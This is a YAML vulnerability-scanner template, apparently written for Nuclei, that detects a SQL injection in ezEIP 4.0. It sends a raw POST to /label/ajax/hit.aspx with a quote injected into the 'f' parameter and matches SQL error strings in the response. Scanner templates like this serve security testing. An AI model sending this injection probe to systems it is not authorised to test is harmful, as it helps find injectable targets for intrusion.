id: ezeip-sqli
info:
  author: Str1am
  name: "ezEIP 4.0 SQL\u6CE8\u5165"
  reference: https://github.com/ffffffff0x/1earn/blob/27236f18098d66d7cf5c881dc70236968d5219cf/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md#activemq
  severity: high
  tags: ezEIP,sqli
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - SqlException
    - DbHelper.CurrentDb
  matchers-condition: and
  raw:
  - 'POST /label/ajax/hit.aspx HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    colid=3&f=hits''&itemid=6&type=0

    '
